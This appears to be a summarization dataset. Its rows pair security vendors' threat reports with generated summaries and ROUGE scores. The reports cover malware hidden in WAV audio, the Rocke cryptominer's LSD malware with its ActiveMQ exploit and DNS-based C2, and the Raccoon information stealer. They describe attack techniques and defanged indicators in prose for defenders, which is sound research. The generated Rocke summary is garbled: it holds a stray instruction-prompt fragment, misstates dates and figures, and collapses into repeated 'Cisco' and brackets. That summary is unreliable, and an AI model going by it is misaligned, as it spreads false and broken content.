TCP connection occurs over po 527.Citations[1] https://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments[2] https://threatvector.cylance.com/en_us/home/report-oceanlotus-apt-group-leveraging-steganography.html[3] https://www.virustotal.com/gui/file/595a54f0bbf297041ce259461ae8a12f37fb29e5180705eafb3668b4a491cecc/detection[4] https://www.virustotal.com/gui/file/d0b99353cb6500bb18f6e83fe9eed9ce16e5a8d5b940181e5eafd8d82f328a59/detection[5] https://www.virustotal.com/gui/file/4fd1d0671395b1b0815b0704d31af816779a6a0a516ea6f82a9196f18bf513cc/detection[6] https://www.virustotal.com/gui/file/843cd23b0d32cb3a36b545b07787ac9da516d20db6504f9cdffa806d725d57f0/detection[7] https://www.virustotal.com/gui/file/7dc620e734465e2f5aaf49b5760df634f8ec8eeab29b5154cc6af2fc2c4e1f7c/detection[8] https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/srand?view=vs-2019[9] https://www.virustotal.com/gui/file/da581a5507923f5b990fe5935a00931d8cd80215bf588abec425114025377bb1/detection[10] https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm[11] https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_https.asm";The ITSecurity report discovered malicious code embedded within WAV audio files. The code was coupled with a loader component for decoding and executing malicious content secretly woven throughout the file's audio data. When played, some of the WAV files produced music that had no discernible quality issues or glitches. Others simply generated static (white noise). Our analysis reveals some of the WAV files contain code associated with the XMRig Monero CPU miner. Others included Metasploit code used to establish a reverse shell. Both payloads were discovered in the same environment, suggesting a twopronged campaign to deploy malware for financial gain and establish remote access within the victim network.;en;{'r': 0.0781563126252505, 'p': 0.9629629629629629, 'f': 0.14457831186433048};{'r': 0.04532304725168756, 'p': 0.912621359223301, 'f': 0.0863573716295197};{'r': 0.0781563126252505, 'p': 0.9629629629629629, 'f': 0.14457831186433048}
https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect;Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect;"SummaryRocke, a China-based cryptomining threat actor, has changed its Command and Control (C2) infrastructure away from Pastebin to a self-hosted solution during the summer of 2019. The setup scripts were hosted on the domains ""lsd.systemten[.]org"" and ""update.systemten[.]org"" as pastes. In September 2019, the actor moved away from hosting the scripts on dedicated servers and instead started to use Domain Name System (DNS) text records. These records are accessed via normal DNS queries or DNS-over-HTTPs (DoH) if the DNS query fails. In addition to the C2 change, functionality was also added to their LSD malware to exploit ActiveMQ servers vulnerable to CVE-2016-3088.The change in technique observed by Rocke is a step forward in regards to the threat actor's overall sophistication. By moving from Pastebin to self-hosted and DNS records, the actor is better protected against potential takedowns, and its malicious operations may become more difficult to detect. As of this writing, Rocke is primarily known for cryptomining, however, it is possible for the actor to change payloads to something more damaging if Rocke wished to try to make illegal funds with a different technique. Therefore, it is paramount to take steps to mitigate the possibility of Rocke-styled campaigns.IntroductionRocke is primarily focusing on illicit cryptomining that is conducted on compromised machines. The group was first reported by Cisco Talos[1] in August 2018, and Palo Alto's Unit 42 has produced numerous reports[2-4] on the group since then. Anomali's Threat Research Team has been tracking the actor's activity since March of 2019. Our report in March described how the actor started to use a malware written in Go (Golang) to set up and monitor the mining on the infected machine.[5] We have been observing the threat actor continuing to use the same malware throughout the year. In April 2019, Confluence users posted reports on Atlassian's support forum reporting infections of cryptominer.[6] Rocke utilized CVE-2019-3396, which was disclosed the month before, to install its malware on vulnerable Confluence servers. The activity of the group continued for a few months with only minor changes to their Tactics, Techniques, and Procedures (TTPs).Summer 2019 activityIn June, Rocke shifted its technique from using ""Pastebin"" to self-hosting the initial setup script. This was performed by using subdomains on the domain ""systemten[.]org"", the domain name that is pointing to the mining pool/proxy used by the threat actor. Two of these subdomains are ""lsd.systemten[.]org"" and ""update.systemten[.]org"". On July 29, 2019, both of these subdomains saw a huge spike in requests, according to data from Cisco Umbrella. The ""update"" subdomain was still being requested until September 17, 2019, when it stopped abruptly. Figures 1 and 2 below are showing both of these events. The ""lsd"" subdomain is still being requested as of writing.Figure 1 - Data from Cisco Umbrella showing queries for ""lsd.systemten[.]org"" for a few days in July. A spike of over 20,000 queries per hour were recorded on July 29, 2019.Figure 2 - Data from Cisco Umbrella showing how queries for ""update.systemten[.]org"" stopped on September 17, 2019.The two subdomains shown above were substituting the actor's use of Pastebin. The ""update"" subdomain returns the current version string. From it, the malware determines if it needs to download a newer version. The ""lsd"" subdomain serves the setup bash script, which is used to set up some persistence via cron jobs and download the latest version of the malware.Changes to the LSD malwareThe ""LSD"" malware has had some updates since it was first reported on by Anomali Threat Research team in March 2019. A reconstruction of the source code layout is shown below:Package github.com/hippies/LSD/LSDB: /root/go/src/github.com/hippies/LSD/LSDB File: <autogenerated> init Lines: 1 to 1 (0) File: a.go _kBytes Lines: 16 to 30 (14) KWR Lines: 30 to 37 (7) File: b.go _libBytes Lines: 14 to 21 (7) LibWrite Lines: 21 to 25 (4) File: c.go _netdnsinitBytes Lines: 11 to 18 (7) _netdnsserviceBytes Lines: 18 to 25 (7) NetdnsWrite Lines: 25 to 34 (9) Package github.com/hippies/LSD/LSDA: /root/go/src/github.com/hippies/LSD/LSDA File: <autogenerated> init Lines: 1 to 1 (0) File: a.go run Lines: 11 to 60 (49) runtwo Lines: 60 to 72 (12) Aago Lines: 72 to 82 (10) Aagofunc1 Lines: 77 to 80 (3) File: b.go generateTask Lines: 17 to 29 (12) cmd Lines: 29 to 56 (27) cmdfunc1 Lines: 37 to 73 (36) cmdtwo Lines: 56 to 68 (12) bgo Lines: 68 to 88 (20) bgofunc1 Lines: 73 to 76 (3) Bbgo Lines: 88 to 93 (5) File: c.go crun Lines: 12 to 48 (36) crunfunc1 Lines: 17 to 65 (48) cruntwo Lines: 48 to 60 (12) Ccgo Lines: 60 to 70 (10) Ccgofunc1 Lines: 65 to 68 (3) File: d.go exp Lines: 13 to 44 (31) expfunc1 Lines: 18 to 67 (49) drun Lines: 44 to 50 (6) druntwo Lines: 50 to 62 (12) Ddgo Lines: 62 to 77 (15) Ddgofunc1 Lines: 67 to 70 (3) Package github.com/hippies/LSD/LSDC: /root/go/src/github.com/hippies/LSD/LSDC File: <autogenerated> init Lines: 1 to 69 (68) File: a.go Read Lines: 24 to 44 (20) StartHttpServer Lines: 44 to 122 (78) StartHttpServerfunc1 Lines: 46 to 287 (241) glob.func1 Lines: 70 to 74 (4) glob.func2 Lines: 74 to 79 (5) glob.func3 Lines: 79 to 90 (11) glob.func4 Lines: 90 to 96 (6) Getcmdnums Lines: 122 to 151 (29) file2Pid Lines: 151 to 175 (24) Getmd5nums Lines: 175 to 214 (39) Mkdir Lines: 214 to 218 (4) Writefile Lines: 218 to 227 (9) Writefiletwo Lines: 227 to 255 (28) Chmod Lines: 255 to 261 (6) Delfile Lines: 261 to 270 (9) Changetime Lines: 270 to 278 (8) Cmdexec Lines: 278 to 284 (6) Checkupdate Lines: 284 to 311 (27) Checkupdatefunc1 Lines: 287 to 335 (48) Updatekill Lines: 311 to 332 (21) getip Lines: 332 to 364 (32) getipfunc1 Lines: 335 to 340 (5) getipb Lines: 364 to 379 (15) Getiplist Lines: 379 to 407 (28) Cron Lines: 407 to 422 (15) Bashrc Lines: 422 to 429 (7) File: b.go procPidStatSplit Lines: 12 to 61 (49) readSmallFile Lines: 61 to 74 (13) readFileLines Lines: 74 to 84 (10) readUInt Lines: 84 to 92 (8) getProcessCpu Lines: 92 to 102 (10) GetProcessCPUPercent Lines: 102 to 111 (9) Killcpu Lines: 111 to 118 (7) Package main: /root/go/src/github.com/hippies/LSD File: <autogenerated> init Lines: 1 to 1 (0) File: main.go attack Lines: 17 to 24 (7) main Lines: 24 to 33 (9)One new functionality is the addition of the ""StartHttpServer"" function. The malware starts a web server that is listening on localhost and TCP port 65533. This serves as a mutex to ensure only one instance of the malware is running because only one application can bind to a specific port. In Figure 3 below it can be seen that the malware tries to connect to this port. If it succeeds, it knows another version is running and it exits. Otherwise, it continues with setting up the machine for mining.Figure 3 - Assembly snippet showing the malware connecting to localhost on port 65533 over TCP.New Exploit AddedThe first iteration of the malware, would try to gain access to other machines via SSH and Redis. This was performed by using weak credentials. Later during the spring, functionality for exploiting Jenkins servers was also added. In this phase, support for CVE-2016-3088 exploitation was the important addition. CVE-2016-3088 is a vulnerability in ActiveMQ that can allow uploading of an arbitrary file. In Figure 4 it can be seen that the malware tries to upload a cron job to the following locations: ""/etc/cron.d/root"", ""/var/spool/cron/root"", and ""/var/spool/cron/crontabs/root"".Figure 4 - The LSD malware tries to add crontab files to ""/etc/cron.d/root"", ""/var/spool/cron/root"", and ""/var/spool/cron/crontabs/root"".The exploit is performed by using two HTTP requests. First, the file is uploaded via a ""PUT"" request as can be seen in Figure 5. The file is then moved to the location for a crontab file via a ""MOVE"" request, shown in Figure 6.Figure 5 - LSD malware constructing a ""PUT"" request to upload the crontab file to ""/fileserver/go.txt"" on the ActiveMQ host.Figure 6 - The malware constructs a ""MOVE"" request to move the crontab file from ""/fileserver/go.txt"" to one of the three crontab locations.King of the HillThe malware tries to ensure only the threat actor's miner is running on the infected machine. It does so by killing any other processes with high CPU usage. The LSD malware identifies its miner via the MD5 hash of the file to make sure it doesn't kill its miner. In Figure 7 below it can be seen that the malware compares the MD5 hash to two hardcoded values. These hashes match the hashes of the 32-bit and the 64-bit version of the miner dropped by the malware.Figure 7 - Screenshot showing the LSD malware comparing the MD5 hashes against two hardcoded values. The hardcoded values matches the hashes for the 32-bit and the 64-bit miner.After the malware knows which process to ignore, it will iterate through all the running processes and capture the CPU usage. If it's above the threshold, the process is killed as can be seen in Figure 8.Figure 8 - The LSD malware gets the CPU usage of all running processes and kills all processes with high CPU usage.September and DoHIn September 2019, Rocke pushed a new version of the LSD malware. The malware maintains the functionality from the samples seen during the summer of 2019. A reconstruction of the source code layout is shown below:Package github.com/hippies/LSD/LSDB: /root/go/src/github.com/hippies/LSD/LSDB File: <autogenerated> init Lines: 1 to 1 (0) File: a.go _kBytes Lines: 15 to 29 (14) KWR Lines: 29 to 49 (20) File: b.go _libBytes Lines: 14 to 21 (7) LibWrite Lines: 21 to 25 (4) File: c.go _netdnsinitBytes Lines: 12 to 19 (7) _netdnsserviceBytes Lines: 19 to 26 (7) NetdnsWrite Lines: 26 to 39 (13) Package github.com/hippies/LSD/LSDA: /root/go/src/github.com/hippies/LSD/LSDA File: <autogenerated> init Lines: 1 to 1 (0) File: a.go run Lines: 11 to 65 (54) runtwo Lines: 65 to 77 (12) Aago Lines: 77 to 87 (10) Aagofunc1 Lines: 82 to 85 (3) File: b.go generateTask Lines: 17 to 29 (12) cmd Lines: 29 to 59 (30) cmdfunc1 Lines: 37 to 76 (39) cmdtwo Lines: 59 to 71 (12) bgo Lines: 71 to 91 (20) bgofunc1 Lines: 76 to 79 (3) Bbgo Lines: 91 to 96 (5) File: c.go crun Lines: 13 to 51 (38) crunfunc1 Lines: 18 to 68 (50) cruntwo Lines: 51 to 63 (12) Ccgo Lines: 63 to 73 (10) Ccgofunc1 Lines: 68 to 71 (3) File: d.go exp Lines: 13 to 46 (33) expfunc1 Lines: 18 to 69 (51) drun Lines: 46 to 52 (6) druntwo Lines: 52 to 64 (12) Ddgo Lines: 64 to 82 (18) Ddgofunc1 Lines: 69 to 72 (3) Package github.com/hippies/LSD/LSDC: /root/go/src/github.com/hippies/LSD/LSDC File: <autogenerated> init Lines: 1 to 69 (68) File: a.go Read Lines: 25 to 45 (20) StartHttpServer Lines: 45 to 91 (46) StartHttpServerfunc1 Lines: 47 to 203 (156) glob.func1 Lines: 71 to 75 (4) glob.func2 Lines: 75 to 80 (5) glob.func3 Lines: 80 to 97 (17) GetCurrentPath Lines: 91 to 128 (37) glob.func4 Lines: 97 to 101 (4) Getcmdnums Lines: 128 to 157 (29) file2Pid Lines: 157 to 181 (24) Getmd5nums Lines: 181 to 200 (19) Downloadfile Lines: 200 to 235 (35) Downloadfilefunc1 Lines: 203 to 398 (195) Update Lines: 235 to 293 (58) Dnstofile Lines: 293 to 308 (15) CopyFile Lines: 308 to 325 (17) Mkdir Lines: 325 to 329 (4) Writefile Lines: 329 to 338 (9) Writefiletwo Lines: 338 to 366 (28) Chmod Lines: 366 to 372 (6) Delfile Lines: 372 to 381 (9) Changetime Lines: 381 to 389 (8) Cmdexec Lines: 389 to 395 (6) Dnsget Lines: 395 to 431 (36) Dnsgetfunc1 Lines: 398 to 491 (93) Checkupdate Lines: 431 to 451 (20) Getcronurl Lines: 451 to 467 (16) Updatekill Lines: 467 to 488 (21) getip Lines: 488 to 520 (32) getipfunc1 Lines: 491 to 496 (5) getipb Lines: 520 to 535 (15) Getiplist Lines: 535 to 563 (28) Cron Lines: 563 to 578 (15) Bashrc Lines: 578 to 585 (7) File: b.go procPidStatSplit Lines: 12 to 61 (49) readSmallFile Lines: 61 to 74 (13) readFileLines Lines: 74 to 84 (10) readUInt Lines: 84 to 92 (8) getProcessCpu Lines: 92 to 102 (10) GetProcessCPUPercent Lines: 102 to 111 (9) Killcpu Lines: 111 to 118 (7) File: c.go NewAesCipher128 Lines: 16 to 52 (36) (*AesCipher128)BlockSize Lines: 52 to 67 (15) (*AesCipher128)Decrypt Lines: 67 to 71 (4) Package main: /root/go/src/github.com/hippies/LSD File: <autogenerated> init Lines: 1 to 1 (0) File: main.go attack Lines: 16 to 27 (11) lsd Lines: 27 to 79 (52) main Lines: 79 to 95 (16)The primary change is in the C2 functionality. Instead of using the domain ""systemten[.]org"" the threat actor has moved over to the domain ""iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com"". According to Cisco Umbrella data, the ""update.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com"" subdomain, shown in Figure 9, started to be queried on September 17. This is the same day as when ""update.systemten[.]org"" stopped being queried.Figure 9 - DNS queries for ""update.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com"" in September 2019. The requests are around 75 requests per hour.Instead of hosting the setup script and update version on a dedicated host, the threat actor is using TXT records. In Figure 10 it can be seen that the malware tries to lookup the TXT record for ""update.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com"". The response is encrypted with AES-128.Figure 10 - Malware uses Go standard library package ""net"" to perform a lookup of the TXT record ""update.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com"".If the lookup fails, the malware tries to perform the same lookup via a DoH request, shown in Figure 11. The server queried for the DoH request is ""cloudflare-dns.com"".Figure 11 - LSD malware creating a DoH request for TXT records.The TXT record values are encrypted with 128-bit AES in cipher-block-chaining (CBC) mode and base64 encoded. The key is derived from the TXT record. Figure 12 shows a summary of the function used to derive the decryption key. The record, for example, ""update.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com"" is hashed with two rounds of MD5. The 128-bit hash digest is passed to the Go standard library function for generating a new AES cipher. The key and block are added to the ""LSDC.AesCipher128"" struct, shown in Figure 13.Figure 12 - Summary of the function used to generate the AES key to decrypt the TXT request answer.Figure 13 - Data structure used to hold decryption information.ConclusionRocke keeps evolving its TTPs in attempts to remain undetected. By moving away from hosting scripts on Pastebin to self-hosted and DNS records, the threat actor is more protected against potential take-downs that could prevent ongoing malicious activity. It is expected that the group will continue to exploit more vulnerabilities to mine additional cryptocurrencies in the near future. Enterprises with internet-facing services should ensure all the software is always up-to-date and that no weak passwords are used. While illicit cryptocurrency mining can be seen as a minor issue, it could lead to increased resource drain and earlier hardware failure. In addition, it is possible that Rocke, or other cryptomining threat actors could change the payload from a cryptominer to something more dangerous, such as ransomware or a Remote Access Trojan (RAT). Therefore, it is paramount to take steps to mitigate the possibility of Rocke-styled campaigns.Enterprise Threatstream users can access more information here, which includes password lists used by the actor for brute force attacks.IOCssystemten[.]orglsd.systemten[.]orgupdate.systemten[.]org1x32.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com2x32.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com3x32.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com1x64.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com2x64.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com3x64.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]comshell.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]comupdate.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]comcron.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]comMITRE ATT&CK(tm) TechniquesTactic ID Name Description Initial Access T1190 Exploit Public-Facing Application Rocke is using exploit known vulnerabilities in public facing services. T1078 Valid Accounts The LSD malware uses stored ssh keys on the infected host to gain access to other machines. Execution T1168 Local Job Scheduling The exploits are used to install cron jobs that will download the LSD malware. T1064 Scripting The cron job will download a shell script that in turn downloads the LSD malware. Persistence T1156 .bash_profile and .bashrc Entries to "".bashrc"" is added to for persistence. T1168 Local Job Scheduling Cron job entries are created to ensure a new version of the LSD malware is installed in the case it is removed. T1501 Systemd Service The LSD malware creates a systemd service to ensure it is restarted when the machine reboots. Defense Evasion T1036 Masquerading The LSD malware use filenames similar to common Linux services. For example, sshd and kerberods. T1099 Timestomp Files created have their timestamp altered to appear older. Credential Access T1110 Brute Force The LSD malware tries to compromise Redis and ssh servers via credential brute forcing. Discovery T1046 Network Service Scanning The LSD malware scans for other machines that are running vulnerable services of ActiveMQ, Jenkins, ssh, and Redis. T1057 Process Discovery The LSD malware enumerates all the running processes to find any other potential miners installed on the machine. If others are found, they are killed. T1018 Remote System Discovery The setup script used by the threat actor uses the known_hosts file to find other machines it can access over ssh. Lateral Movement T1021 Remote Services The setup script uses known ssh hosts and stored ssh keys to infect other machines. Command and Control T1043 Commonly Used Port The LSD uses HTTP/HTTPs and DNS TXT records for C2. T1132 Data Encoding The data retrieved from the DNS TXT records are encrypted and base64 encoded. T1079 Multilayer Encryption The LSD malware uses DoH to retrieve encrypted instructions. T1071 Standard Application Layer Protocol The LSD uses HTTP/HTTPs and DNS TXT records for C2. Impact T1496 Resource Hijacking The LSD malware installs a Monero miner.Endnotes";"Rocke is primarily focusing on illicit cryptomining that is conducted on compromised machines. The group was first reported by Cisco Talos[1] in August 2018, and Palo Alto's Unit 42 has produced numerous reports[24] on the group since then. Anomali's Threat Research Team has been tracking the actor's activity since March of 2019. Our report in March described how the actor started to use a malware written in Go (Golang) to set up and monitor the mining on the infected machine. [5] We have been observing the threat actor continuing to use the same malware throughout the year. In April 2019, Confluence users posted reports on Atlassian's support forum reporting infections of cryptominer. [6] Rocke utilized CVE20193396, which was disclosed the month before, to install its malware on vulnerable Confluence servers. The activity of the group continued for a few months with only minor changes to their Tactics, Techniques, and Procedures (TTPs).Summer 2019 activityIn June, Rocke shifted its technique from using ""Pastebin"" to selfhosting the initial setup script. This was performed by using subdomains on the domain ""systemten[. ]org"", the domain name that is pointing to the mining pool/proxy used by the threat actor. Two of these subdomains are ""lsd.systemten[. ]org"" and ""update.systemten[.]org"". ### Instruction: Summarize the ITSecurity report ### Input: ]org"" and ""update.systemten[.]org"". On July 29, 2019, both of these subdomains saw a huge spike in requests, according to data from Cisco Umbrella. The ""lsd"" subdomain was still being requested as of September 17, 2019, when it stopped abruptly. Figures 2 and 3 below are showing both of these events. Figure 2 Data from Cisco Umbrella showing queries for ""lsd.systemten[.]org"" for a few days in July. A spike of over 20,000 queries per hour were recorded on July 29, 2019, when it stopped abruptly. Figure 3 Data from Cisco Umbrella showing queries for ""lsd.systemten[.]org"". The ""lsd"" subdomain is substituting the actor's use of Pastebin. The ""update.systemten[.]org"" was substituting the actor's use of Pastebin. The ""lsd.systemten[.]org"" was substituting the Cisco Umbrella. Cisco. Cisco Cisco.org Cisco [ [ [ [ [ [ [1,2, the report, the following report the following report. The LSD malware uses stored ssh keys on the infected host to gain access to other machines. The ITSecurity report states that the LSD malware is capable of persistence, local job scheduling, masquerading, defense evasion, credential access, network service scanning, process discovery, remote system discovery, lateral movement, command and control, data encoding, multilayer encryption, and resource hijacking.";en;{'r': 0.19835560123329907, 'p': 0.8502202643171806, 'f': 0.32166666359901397};{'r': 0.1268450184501845, 'p': 0.78125, 'f': 0.21825396585054174};{'r': 0.1963001027749229, 'p': 0.8414096916299559, 'f': 0.3183333302656806}
https://www.cybereason.com/blog/research/hunting-raccoon-stealer-the-new-masked-bandit-on-the-block;Hunting Raccoon: The New Masked Bandit on the Block;"Research by: Assaf Dahan & Lior RochbergerIntroductionSince April 2019, the Cybereason Nocturnus team has investigated multiple infections of the Raccoon stealer in the wild across organizations and individuals. In this research, we focus on two key aspects:A Glimpse Into the Underground: A survey of Raccoon's origin, team members, business model, and marketing efforts, as well as Raccoon's reception by the underground cybercrime community and the existing feuds between Raccoon's team and their direct competitors.A survey of Raccoon's origin, team members, business model, and marketing efforts, as well as Raccoon's reception by the underground cybercrime community and the existing feuds between Raccoon's team and their direct competitors. A Technical Breakdown: A comprehensive technical overview of Raccoon's current capabilities and delivery methods, with a look into their future plans for the malware.The top 10 malware mentions over seven months in 2019 from Recorded Future.The Raccoon stealer is one of the 2019 top 10 most-mentioned malware in the underground economy and is widely known to have infected hundreds of thousands of devices around the world, despite it not being overly sophisticated or innovative. This strain of malware first emerged as recently as 2019, and has already established a strong following among cybercriminals. Its popularity, even with a limited feature set, signals the continuation of a growing trend of the commoditization of malware as they follow a MaaS (Malware-as-a-Service) model and evolve their efforts.Build an iterative defense that addresses threats like these. Read our white paper on how to use MITRE ATT&CK to create a closed-loop security process.Key PointsThe Raccoon Infostealer : The Cybereason Nocturnus team has been investigating multiple incidents involving the Raccoon infostealer since April 2019, and is now able to give a thorough analysis of the technical aspects of the malware alongside a look into the likely Russian team behind it.: The Cybereason Nocturnus team has been investigating multiple incidents involving the Raccoon infostealer since April 2019, and is now able to give a thorough analysis of the technical aspects of the malware alongside a look into the likely Russian team behind it. Steals a Wide Range of Data : Raccoon lacks sophistication, but leverages several potential delivery methods and is able to steal a large swath of important data, including credit card information, cryptocurrency wallets, browser data, and email credentials.: Raccoon lacks sophistication, but leverages several potential delivery methods and is able to steal a large swath of important data, including credit card information, cryptocurrency wallets, browser data, and email credentials. Is Quickly Gaining Traction : Despite being released earlier this year, the Raccoon stealer is exploding in popularity in the underground community to become one of the top 10 most-referenced malware on the market in 2019, infecting hundreds of thousands of endpoints globally across organizations and individuals in North America, Europe, and Asia.: Despite being released earlier this year, the Raccoon stealer is exploding in popularity in the underground community to become one of the top 10 most-referenced malware on the market in 2019, infecting hundreds of thousands of endpoints globally across organizations and individuals in North America, Europe, and Asia. Enables Any Individual to Easily Commit Cybercrime : Raccoon follows a malware-as-a-service model, allowing individuals a quick-and-easy way to make money stealing sensitive data without a huge personal investment or technical know-how.: Raccoon follows a malware-as-a-service model, allowing individuals a quick-and-easy way to make money stealing sensitive data without a huge personal investment or technical know-how. Has a Strong Following Underground: The team behind Raccoon is lauded in the underground community for their level of service, support, and user experience, but has faced several bouts of public feuds and internal disputes.TABLE OF CONTENTSRaccoon, also known as ""Mohazo"" or ""Racealer"", is at its core a simple information stealer often seen delivered by the Fallout and RIG Exploit Kits. It is used to steal data like credit card information, cryptocurrency wallets, browser-related data, and mail clients. Although it is not an advanced malware, it is estimated to have infected hundreds of thousands of devices around the world and is in the top 10 mentioned in the underground communities for 2019.Raccoon is written in C++ and works on both 32-bit and 64-bit operating systems. Though it was originally classified as a password stealer by many AV companies, we and others in the community see it leverage broader capabilities and categorize it as an information stealer.Raccoon searches system files for a range of confidential data which it saves and sends to its operator. It is able to collect the following data:Credit Card DataCryptocurrency WalletsPasswordsEmailsData from All Popular Browsers Including Credit Card Info, URLs, Usernames, PasswordsCookiesSystem InformationThreat Actor OverviewThe Raccoon stealer is developed by a team that appears to originate in Russia and be Russian-speaking. The team initially promoted the stealer in exclusively Russian-speaking hacking forums, but now actively promotes it in English-speeaking communities as well. It is aggressively marketed in the cybercrime underground and has been since April 2019.Raccoon stealer marketed in a Russian underground forum.Raccoon is sold as a MaaS with features like an easy-to-use automated backend panel, bulletproof hosting, and 24/7 customer support in both Russian and English. As of this writing, it costs $200 per month to use.How to contact the Raccoon Team.Much like any other software-as-a-service, the Raccoon stealer appears to be in active development. The development team seems to be quick, responsive, and dedicated, using short development cycles to release updates, bug fixes, and new features within days. They are also highly active in underground communities under the username raccoonstealer. They post daily and reply to community questions and comments within hours in underground forums and on Telegram.Who is behind the Raccoon Stealer?While the identity of the team behind Raccoon remains unknown, some members in the underground community attribute the project to another well-known member, glad0ff. Alexuiop1337, the author of predator stealer and one of the strongest critics of Raccoon, was one of the first to make this allegation. Of course, the accusations made by direct competitors should be taken with a grain of salt. However, the leads Alexuiop1337 provided in his blog can potentially tie glad0ff to Raccoon.An analysis of the Raccoon stealer's hacked panel and leaked customer base could imply the admin of Raccoon is a user with the online handle glad0ff. The user glad0ff was created in the Raccoon stealers database in February of 2019, roughly two months before the team began aggressively marketing Raccoon to the underground community.glad0ff user creation date in Raccoon's database.One of the first mentions of Raccoon in underground forums.Who is glad0ff?glad0ff is a long-time threat actor responsible for developing malware like the Decrux and Acrux cryptominers, the Mimosa RAT and the ProtonBot loader. glad0ff caters to less sophisticated cyber criminals looking for easy-to-use, end-to-end solutions. Similar to customers of Raccoon, customers from many of glad0ff's previous projects praise the quality of service, dedication, and responsiveness when fixing issues. It was previously believed that glad0ff operated alone, however, there are indications that the Raccoon stealer involved other members, as we discuss later on.It's also interesting to note that glad0ff stopped posting in many underground forums in April of 2019, which aligns with the launch of the Raccoon stealer.Last seen date for the glad0ff user.Is Raccoon Tied to Malware from Other Threat Actors?Other members in the underground community have questioned whether Raccoon is linked to other stealers like Vidar and Baldr, as they noticed great similarities between the aforementioned infostealers. Raccoon team members consistently deny any ties to other stealers.""Do you have any relation to the Vidar team?"" Reply: ""No.""Raccoon's Reception in the Underground CommunityIt is interesting to note that many individuals choose to write reviews for Raccoon. As malware authors turn to MaaS, they follow many of the same paths as a legitimate SaaS business: marketing efforts, relying on positive reviews, responsive customer support, and regularly improving features in their product.Positive Feedbacks and EndorsementsGenerally, feedback around Raccoon in the underground community is positive. Many in the community praise and endorse Raccoon's malware capabilities and the services the team provides. Some voices in the community even endorse it as a worthy replacement for the famous Azorult stealer. However, it is important to note that there are some dissenting opinions. Advanced members in the community find Raccoon to be simple and lacking in features when compared to other information stealers. With that said, many in the community believe that while the malware may lack in features, sophistication, or innovation, it largely makes up for it with consistency and an impressive level of service, support, and quality user experience.Raccoon's popularity combined with its limited feature set yet high adoption speaks to a growing trend of the commoditization of malware, as malware authors shoot to create platforms for crime instead of committing the crimes directly.Example 1: Early Adopter Replaces AzorultThis early adopter of Raccoon claims he has been using it since the initial launch. After Azorult was shut down at the end of 2018, he tried almost every stealer on the market before settling on Raccoon.""I am among the first clients of these guys, practically using their product since the initial launch. I have used many other stealers before, essentially i tried all there is in this market to offer. After the ""death"" of ""azora"" (Azorult malware), I searched for a long time for a decent replacement and finally, found it in Racoon!Example 2: Praise for Excellent ServiceThis user leveraged a free trial of Raccoon, and deemed it an excellent product they were interested in switching to. They specifically reference one instance where there was a bug in the panel's search engine that was fixed immediately on the fly.""They let me try the stealer for a few days. In general, first impressions were good. The rate of successful infection is very good. Had an issue with the control panel's search engine. Problem was solved immediately, on the fly ) There is no support for IE, and the download of all logs, but i have been told that these features will be added in the near future. Not bad at all. Thinking of getting it as soon as my current lease is over)""Example 3: User Testimonial - A Worthy Replacement for AzorultThis user switched from Azorult to Raccoon because of how easy the control panel was to use. In addition, the user experiences a very high success rate and is a big supporter of the quality of service.""I switched from azor (Azorult) to raccoon and got a great joy of how convenient the admin control panel is, there are no extra, unnecessary details such as in vidar (Vidar malware) but there are these small, little details that are helpful and mandatory for people who process a large amount of logs. If judging the build, that everything is alright, with azor i always had around 60%+ of successful infection rate and here i found a good crypter and have 90% of rate...[snipped] What surprised me is the support that treats you as a VIP class client, they will do whatever you demand and with expressing gratitude, etc. it is very nice and I have never seen experienced it anywhere else.""Criticism of Raccoon by Members of the Underground CommunitySince day one, some members of the underground community have criticized Raccoon, specifically targeting it's lack of capabilities, poor coding, and several security issues in the infrastructure and admin panel code.Perhaps one of the most negative reviews comes from Alexuiop1337. Alexuiop1337 wrote a very detailed blog dissecting and criticizing the malware and its infrastructure. According to Alexuiop1337, Raccoon has vulnerabilities that let attackers DDoS their servers and dump sensitive data. In his review, Alexuiop1337 also tries to expose the identity of one of the developers behind Raccoon by claiming it is glad0ff/wankfbi, another member of the underground communityOther negative reviews voiced by customers or testers complain that Raccoon has:A low success rate for infection at about 45%. Some bugs that make it difficult to access logs and delete logs from the control panel. Some missing information or version compatibility issues in its stealing modules.""- The stealer often doesn't still software or its version, and for me it was importantThe cookies from the stealer are often transferred incomplete,I don't understand why it does it, but in the previous stealer there were no such problems ""Public Disputes and Controversies with the Raccoon TeamWithin the underground community, the Raccoon team is also facing some public disputes and controversies. These disputes offer an important glimpse into the inner workings of the team and give a broader sense of just how competitive the commodity malware market is.In addition, these conflicts validate our hypothesis that Raccoon is not operated by a single user, but by a team. It gives insight into the types of relationships the team members have and how fragile and opportunistic those ties can be.Internal Disputes Shed Light on the Raccoon Team DynamicsThe first public signs of tension between Raccoon team members began shortly after their launch in April. Following a leak of their customer database, the team released a statement claiming their servers were not hacked, but that the leak was caused by a disgruntled team member using the database as blackmail for more money. When the team member demands were not met, they released the database to embarrass the Raccoon team. Though the team explicitly states the blackmailer was not working directly with their competitors, they did accuse Alexuiop1337 and overdot of hyping the situation in order to capitalize on it.""The aforementioned user had access to the intra-team test API (dock), had all the links, had a password from the admin account, which allowed us to document the list of users and register accounts for their unfortunate pentesters. Yes, our mistake was that after the reorganization of the team, we did not react quickly enough, no one expected such meanness.""""This person will do what it takes, for personal revenge against the project. On the launch day, he demanded money from us, threatened us, but even after that 